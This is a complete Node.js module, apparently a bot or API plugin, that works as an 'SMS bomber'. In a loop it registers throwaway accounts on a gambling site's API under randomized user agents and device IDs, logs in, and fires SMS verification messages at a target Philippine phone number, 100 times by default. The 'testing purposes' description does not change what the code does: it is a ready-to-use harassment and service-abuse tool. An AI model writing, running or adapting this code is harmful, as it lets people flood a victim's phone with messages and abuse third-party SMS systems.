const axios = require("axios");
const randomUseragent = require("random-useragent");

exports.config = {
    name: "smsbomber",
    category: "tools",
    aliases: ["smsbomb",
        "sendsms"],
    info: "Send bulk SMS to a target phone number for testing purposes.",
    usage: ["/smsbomber?phone=09276547755&times=10"],
    author: "Kenneth Panio"
};

const generateRandomString = (length) => {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
};

const generateUuidDeviceId = () => {
    return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (c) => {
        const r = Math.random() * 16 | 0;
        const v = c === "x" ? r: (r & 0x3) | 0x8;
        return v.toString(16);
    });
};

const createAccount = async (username, password, phone) => {
    try {
        const {
            data
        } = await axios.post(
            "https://slotmax.vip/api/user/custom/register",
            {
                username, password, code: Date.now(), phone, areaCode: "63"
            },
            {
                headers: {
                    "User-Agent": randomUseragent.getRandom((ua) => ua.browserName === "Firefox"),
                    "Accept": "application/json, text/plain, */*",
                    "Content-Type": "application/json",
                    "requestfrom": "H5",
                    "deviceid": generateUuidDeviceId(),
                    "referer": `https://slotmax.vip/game`
                },
            }
        );
        return data;
    } catch (error) {
        console.error("Account creation error:", error.response?.data || error.message);
        return null;
    }
};

const login = async (username, password) => {
    try {
        const {
            headers
        } = await axios.post(
            "https://slotmax.vip/api/user/login",
            {
                username, password
            },
            {
                headers: {
                    "Content-Type": "application/json",
                    "User-Agent": randomUseragent.getRandom((ua) => ua.browserName === "Firefox"),
                },
            }
        );
        return headers["set-cookie"][0];
    } catch (error) {
        console.error("Login error:", error.response?.data || error.message);
        return null;
    }
};

const sendSms = async (cookie, phone) => {
    try {
        const {
            data
        } = await axios.post(
            "https://slotmax.vip/api/user/sms/send/bind",
            {
                phone, areaCode: "63"
            },
            {
                headers: {
                    "Content-Type": "application/json",
                    "User-Agent": randomUseragent.getRandom((ua) => ua.browserName === "Firefox"),
                    cookie,
                },
            }
        );
        return data;
    } catch (error) {
        console.error("SMS send error:", error.response?.data || error.message);
        return null;
    }
};

// Initialization Function
exports.initialize = async ({
    req, res
}) => {
    let {
        phone,
        times
    } = req.query;
    times = parseInt(times, 10) || 100;

    if (phone.startsWith("+63")) {
        phone = phone.slice(3);
    } else if (phone.startsWith("63")) {
        phone = phone.slice(2);
    } else if (phone.startsWith("0")) {
        phone = phone.slice(1);
    }

    if (!phone || !/^\d{10}$/.test(phone)) {
        return res.status(400).json({
            error: "Invalid times or missing phone number should be PH number only. start with +63, 63 or 09, 9"
        });
    }

    console.log("📨 Starting SMS bombing...");
    let successCount = 0;
    let failCount = 0;

    for (let i = 0; i < times; i++) {
        const username = generateRandomString(12);
        const password = generateRandomString(16);

        const account = await createAccount(username, password, phone);
        if (!account) {
            failCount++;
            continue;
        }

        const cookie = await login(username, password);
        if (!cookie) {
            failCount++;
            continue;
        }

        const result = await sendSms(cookie, phone);
        if (result?.success) {
            successCount++;
            console.log(`✅ SMS ${i + 1} sent successfully.`);
        } else {
            failCount++;
            console.log(`❌ SMS ${i + 1} failed.`);
        }
    }

    res.json({
        status: true,
        message: `SMS bombing completed.`,
        details: {
            success: successCount, failed: failCount
        },
        author: exports.config.author,
    });
};